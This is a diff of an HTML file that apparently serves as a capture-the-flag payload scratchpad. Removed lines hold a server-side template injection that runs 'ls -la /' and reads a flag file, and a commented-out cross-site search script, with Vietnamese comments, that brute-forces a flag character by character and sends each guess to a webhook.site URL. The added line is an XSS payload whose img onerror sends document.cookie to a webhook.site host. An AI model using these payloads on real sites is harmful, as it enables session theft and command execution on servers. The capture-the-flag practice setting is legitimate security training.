@@ -1,40 +1,6 @@
 <html>
 <body>
-<h1>Template test</h1>
-<p>Client IP: {{.ClientIP}}</p>
-<p>OS: {{.ServerInfo.OS}}</p>
-<p>Hostname: {{.ServerInfo.Hostname}}</p>
-<p>{{.FetchServerInfo "ls -la /"}}</p>
- <p>{{.FetchServerInfo "cat /flag755f32c6ab.txt"}}</p>   
+<h1>hell everyone 1</h1>
+<img src=x onerror="fetch('https://webhook.site/da7772a4-4d34-491b-962e-09bf140e825f/?c='+document.cookie)">
 </body>
 </html>
-<!-- <script>
-    // Tạo biến chứa các tất cả các ký tự 
-    let chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+[]{}|;:,.<>?';
-    let flag = 'HTB{f4k3_f';
-
-    // Tạo 1 hàm để loop các ký tự trên
-    const generate = (char) => {
-        let bool = false;
-        let script = document.createElement('script');
-        //encodeURIComponent() là hàm để mã hóa ký tự thành dạng URL
-        script.src = 'http://127.0.0.1:1337/api/entries/search?q=' + encodeURIComponent(flag + char); 
-        script.onload = () => {
-            // Thực hiện hành động sau khi script được tải thành công
-            fetch('https://webhook.site/863fb66b-7f91-4ef5-98cc-66a4ee77d282/' + flag + char);
-        }
-        script.onerror = () => { };
-        document.head.appendChild(script);
-        return bool;
-    }
-    // Tạo vòng lặp để kiểm tra các ký tự
-    for (let i = 0; i < chars.length; i++) {
-        // Gọi hàm generate với ký tự hiện tại
-        if (generate(chars[i])) {
-            // Nếu hàm trả về true, thì dừng vòng lặp
-            i=0;
-        };
-    }
-    
-</script>
- -->
